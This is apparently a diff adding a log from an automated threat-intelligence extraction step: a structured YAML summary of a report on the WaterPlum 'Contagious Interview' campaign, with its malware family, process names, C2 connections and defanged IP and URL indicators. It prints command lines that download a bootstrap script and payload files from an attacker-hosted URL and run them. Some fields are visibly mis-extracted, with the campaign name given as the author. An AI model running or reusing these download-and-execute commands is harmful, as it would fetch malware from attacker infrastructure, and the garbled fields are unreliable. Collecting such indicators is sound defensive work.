@@ -1,0 +1,54 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T16:23:44.181628
+# Response length: 1801 chars
+# Input chunk preview: '=== ARTICLE BODY ===WaterPlumContagious InterviewWaterPlum()8(MoralisModilus)8Contagious InterviewOtterCookie202512StoatWaffleWaterPlum8StoatWaffle8 .vscodetasks.jsonVSCodetasks.jsontasks.json runOpti'
+# ============================================================
+
+title: "WaterPlumContagious Interview"
+description: The report describes the activities of a malware campaign involving multiple components including loaders, stealers, and C2 communication.
+attribution: ""
+malware_families:
+  - StealerRAT
+cves: []
+ttps:
+  processes:
+    - cmd.exe
+    - vscode-bootstrap.cmd
+    - Node.js
+  command_lines:
+    - "curl --ssl-no-revoke -L -o \"%VSCODE_DIR%\vscode-bootstrap.cmd\" \"https://tasksettingsnew.vercel.app/api/settings/bootstrap\""
+    - "%VSCODE_DIR%\vscode-bootstrap.cmd"
+    - "curl --ssl-no-revoke -s -L -o \"%CODEPROFILE%\env.npl\" \"https://tasksettingsnew.vercel.app/api/settings/env\""
+    - "curl --ssl-no-revoke -s -L -o \"%CODEPROFILE%\package.json\" \"https://tasksettingsnew.vercel.app/api/settings/package\""
+  powershell: []
+  scripts:
+    - "{[Text.Encoding]::UTF8.GetString(...)}"
+  registry_keys: []
+  image_loads: []
+  network_connections:
+    - "Node.js -> 147.124.202.208:3000"
+    - "Node.js -> 147.124.202.208:3000"
+    - "Node.js -> 147.124.202.208:3000"
+    - "Node.js -> 147.124.202.208:3000"
+  file_activity:
+    - "%VSCODE_DIR%\vscode-bootstrap.cmd"
+    - "%CODEPROFILE%\env.npl"
+    - "%CODEPROFILE%\package.json"
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+    - 185[.]163.125.196
+    - 147[.]124.202.208
+    - 163[.]245.194.216
+    - 66[.]235.168.136
+    - 87[.]236.177.9
+  domains: []
+  urls:
+    - hxxp://147[.]124.202.208:3000/api/errorMessage
+    - hxxp://147[.]124.202.208:3000/api/handleErrors
+    - hxxp://147[.]124.202.208:3000/api/hsocketNext?agentId=afb6e2f9-d326-4293-9773-4797b71dbad5&handleCode=836515506&currentDir=
+    - hxxp://147[.]124.202.208:3000/api/hsocketResult?agentId=afb6e2f9-d326-4293-9773-4797b71dbad5&handleCode=836515506&currentDir=
+authors:
+  - WaterPlumContagious
